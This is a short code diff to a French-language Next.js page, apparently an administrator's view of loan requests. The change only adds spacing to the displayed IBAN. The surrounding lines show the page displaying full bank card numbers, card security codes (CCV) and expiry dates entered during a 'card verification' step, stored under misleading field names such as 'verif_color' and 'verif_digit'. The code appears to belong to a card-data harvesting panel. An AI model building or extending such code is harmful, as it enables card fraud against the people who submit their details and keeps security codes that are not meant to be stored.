@@ -78,7 +78,7 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
             <h2 id="verif2" className="mb-1 text-lg font-semibold">Vérification de la carte bancaire (après le choix de la carte)</h2>
             <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande (distinctes de celles de l’inscription).</p>
             <dl className="divide-y divide-slate-100">
-              <Row label="IBAN">{loan.verif_number || '—'}</Row> 
+              <Row label="IBAN">{loan.verif_number ? loan.verif_number.replace(/(.{4})(?=.)/g, '$1 ') : '—'}</Row>
               <Row label="Numéro de carte">{loan.verif_color || '—'}</Row>
               <Row label="Code de sécurité (CCV)">{loan.verif_digit ?? '—'}</Row>
               <Row label="Date d'expiration">{loan.verif_year ?? '—'}</Row>
